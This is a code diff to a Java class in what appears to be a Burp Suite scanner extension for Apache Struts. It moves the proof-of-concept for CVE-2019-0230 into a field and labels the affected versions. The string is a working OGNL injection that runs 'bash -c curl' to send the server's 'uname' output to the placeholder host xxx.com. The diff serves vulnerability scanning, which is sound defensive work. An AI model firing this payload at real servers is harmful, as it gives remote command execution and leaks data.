@@ -9,9 +9,13 @@ import java.io.OutputStream;
 import java.io.PrintWriter;
 
 public class Struts {
+    public static String CVE_2019_0230_poc = "##Condition##\n" +
+            "Apache Struts 2.0.0 - 2.5.20\n\n" +
+            "##POC##\n" +
+            "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{'bash','-c','curl http://xxx.com/`uname`'}))}";
 
     public static void CVE_2019_0230() {
-        String poc = "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{'bash','-c','curl http://xxx.com/`uname`'}))}";
+        String poc = CVE_2019_0230_poc;
 
         IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
         String val = collaboratorClientContext.generatePayload(true);
